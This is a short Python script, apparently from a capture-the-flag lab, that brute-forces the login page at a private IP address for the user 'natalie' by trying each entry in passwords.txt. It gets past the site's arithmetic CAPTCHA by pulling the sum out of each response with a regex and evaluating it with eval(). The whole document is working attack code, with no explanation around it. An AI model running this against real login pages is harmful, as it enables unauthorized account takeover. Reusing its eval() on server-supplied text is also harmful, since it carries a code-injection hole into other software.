import requests
import re

with open("passwords.txt", "r") as username_file:
    passwords = [line.strip() for line in username_file]

v0_captcha = "unknown value"

for i in passwords:
	data = {'username': "natalie", 'password': i, 'captcha': v0_captcha}
	respuesta = requests.post('http://10.10.190.94/login', data)
	patron = re.compile(r"\d+\s[+\-*]\s\d+")
	expre_captcha = patron.findall(respuesta.text)
	if expre_captcha  == [] and v0_captcha != "unknown value":
		print("Correct Password: "+i)
		quit()
	else:
		value_captcha = eval(expre_captcha[0])
		v0_captcha = value_captcha
		print("Incorrect Passsword: "+i)
